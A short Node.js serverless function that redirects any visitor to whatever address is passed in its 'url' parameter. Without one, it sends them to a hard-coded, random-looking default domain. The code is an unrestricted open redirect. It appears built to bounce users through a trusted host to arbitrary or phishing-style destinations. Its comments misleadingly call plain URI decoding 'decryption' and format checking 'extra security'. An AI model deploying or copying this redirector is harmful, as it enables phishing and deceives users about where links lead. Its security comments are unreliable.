module.exports = (req, res) => {
    // Get the query parameter 'url' from the request
    const encryptedUrl = req.query.url;

    // Default link to redirect to (in case no URL is provided)
    const defaultUrl = 'https://nlbnklko.voulastai.co.za/@KIdNRlwwaKTN/';

    // If the 'url' query parameter is provided
    if (encryptedUrl) {
        try {
            // Decode the URL (the encrypted URL)
            const decodedUrl = decodeURIComponent(encryptedUrl);

            // Validate the decoded URL (optional step for extra security)
            try {
                new URL(decodedUrl); // This will throw an error if the URL is invalid
            } catch (e) {
                return res.status(400).send('Bad Request: Invalid URL format.');
            }

            // Send the redirect response with status 301 (permanent redirect)
            res.writeHead(301, { 'Location': decodedUrl });
            res.end();
        } catch (err) {
            // If there is an error decoding the URL, send a bad request response
            res.status(400).send('Bad Request: Invalid URL encoding.');
        }
    } else {
        // If no 'url' query parameter is provided, redirect to the default URL
        res.writeHead(301, { 'Location': defaultUrl });
        res.end();
    }
};
